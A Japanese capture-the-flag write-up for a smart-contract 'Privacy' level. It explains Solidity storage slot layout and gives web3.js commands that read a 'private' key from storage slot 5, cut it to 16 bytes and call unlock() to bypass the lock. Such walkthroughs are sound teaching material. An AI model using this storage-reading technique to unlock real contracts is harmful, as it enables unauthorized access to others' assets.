# 問題

Privacy contractのpublic bool lockedをfalseに設定する

- unlock 関数はすでに作成されている
    ```sol
    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
    ```
    - が、requireでdata[2]を16byteにした値を知る必要がある
    - dataはbytes32[3]型のprivate変数

## ハック

### 前提

- private変数はコントラクトの外から取得することは不可能ではない
- level8でも同じようにprivate変数を取得して突破した
- slot: 32bytesごとに1slot
    - コントラクトの上の行から順番に0slot,1slot,と格納場所が決まっていく
    - 32bytes以上のデータは、複数のslotに跨って格納される
    - web3jsの、web3.eth.getStorageAt("CONTRACT_ADDRESS", "slot番号")によって確認する
        - たぶんethersjsにも同じようなのあるはず


### 手順
- private変数 data の値が、コントラクトのstorage内のどのslotに格納されているか推測する

```sol
contract Privacy {

  bool public locked = true; // bool型なのでデータの大きさ1byte 32bytes以下なので1つのスロットのみで足りる。格納場所はslot0
  uint256 public ID = block.timestamp; // uint256 は32byte slot0に入れると1byte足りないので、この場合slot1に格納
  uint8 private flattening = 10; // uint8は1byte 格納場所はslot2
  uint8 private denomination = 255; uint8は1byte 格納場所はslot2
  uint16 private awkwardness = uint16(block.timestamp); uint16は2byte 格納場所はslot2 => slot2 には、4byte分のデータが入った
  bytes32[3] private data; // Arrayのデータは常に新しいslotを使う。なのでslot3からデータ入れていく
  // そして、32byteのarrayなので、data[0]の値はslot3, data[1]の値はslot4,data[2]の値はslot5となる。
  .........
```

- 検証ツールで、data[2]を取得
```js
await web3.eth.getStorageAt("CONTRACT_ADDRESS_HERE", 5);
=>
"0xe39eea38e8760953ec4b573eb5696c6dd47ba9dc01eafd706b287faba7025aa0"
```

- 取得したdata[2]の値が32byteのままなので、16byteに変換する 
    - 最初の16byteつまり32桁を取得すればいいのだが、値の最初に0xが入っているのでそれを考慮する

```js
let data2 = await web3.eth.getStorageAt("CONTRACT_ADDRESS_HERE", 5);

let byte16data2 = data2.substring(0,34);
await contract.unlock(byte16data2);
// ここでtxが実行される
await contract.locked()
// false
```

- lockedがfalseになってること確認できたらクリア
